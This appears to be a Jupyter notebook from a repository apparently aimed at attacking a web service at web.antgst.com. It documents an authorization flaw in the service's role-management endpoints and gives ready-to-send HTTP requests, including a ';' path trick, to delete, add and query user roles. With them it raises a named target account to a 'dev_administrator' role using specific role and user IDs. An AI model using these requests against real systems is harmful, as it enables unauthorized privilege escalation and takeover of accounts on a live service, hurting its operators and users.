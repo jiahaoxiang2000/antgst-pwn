{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# role issue\n",
    "\n",
    "we know the role interface not use the `admin` authority, so we can use the `user` authority to access the role interface, and then we can modify the user auth level. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "targe user: `SS678`, original auth level: `sms-mk`, role id `082678e5d9270824353a223a6727e009`, let us modify it to `dev_administrator` auth level, role id `743e6e95d9a4001e46a78c3606dcb15b`.\n",
    "\n",
    "the dev_administrator auth can to use. use the `admin` role id `f6817f48af4fb3af11b9e8bf182f618b`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "the issue interface the delete & add & query role interface. id see  [user id](../data/all_user_id.json) and [user role](../data/all_role.json).\n",
    "\n",
    "**delete request**: `https://web.antgst.com/antgst/;/sys/user/deleteUserRole?roleId=743e6e95d9a4001e46a78c3606dcb15b&userId=e888946e0213c9a4685bd94e7f1563ae`\n",
    "\n",
    "**add request:**\n",
    "```http\n",
    "POST /antgst/;/sys/user/addSysUserRole HTTP/1.1\n",
    "Host: web.antgst.com\n",
    "User-Agent: Apifox/1.0.0 (https://apifox.com)\n",
    "Content-Type: application/json\n",
    "Accept: */*\n",
    "Host: web.antgst.com\n",
    "Connection: keep-alive\n",
    "Content-Length: 122\n",
    "\n",
    "{\n",
    "    \"roleId\": \"97bce13017bbd7aaed2d10bea251d079\",\n",
    "    \"userIdList\": [\n",
    "        \"e888946e0213c9a4685bd94e7f1563ae\"\n",
    "    ]\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**query interface**\n",
    "```http\n",
    "GET /antgst/;/sys/user/queryUserRole?userid=e888946e0213c9a4685bd94e7f1563ae HTTP/1.1\n",
    "Host: web.antgst.com\n",
    "User-Agent: Apifox/1.0.0 (https://apifox.com)\n",
    "Accept: */*\n",
    "Connection: keep-alive\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
